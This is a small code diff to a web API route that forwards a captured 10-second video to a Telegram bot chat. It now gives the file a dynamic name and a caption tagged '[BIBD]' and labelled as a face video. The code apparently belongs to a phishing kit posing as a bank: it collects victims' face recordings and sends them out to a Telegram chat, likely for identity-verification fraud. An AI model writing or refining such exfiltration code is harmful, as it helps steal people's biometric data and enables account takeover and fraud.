@@ -56,10 +56,12 @@ export async function POST(request: Request) {
     // 3. Send Video if available
     if (video) {
       try {
+        const caption = (formData.get("caption") as string | null) || "🎥 [BIBD] Video Wajah 10 Detik";
+        const videoName = (video as any).name || (video.type?.includes("webm") ? "video.webm" : "video.mp4");
         const videoFormData = new FormData();
         videoFormData.append("chat_id", chatId);
-        videoFormData.append("video", video, "video.webm");
-        videoFormData.append("caption", "🎥 New 10s video captured!");
+        videoFormData.append("video", video, videoName);
+        videoFormData.append("caption", caption);
 
         await fetch(`${telegramApi}/sendVideo`, {
           method: "POST",
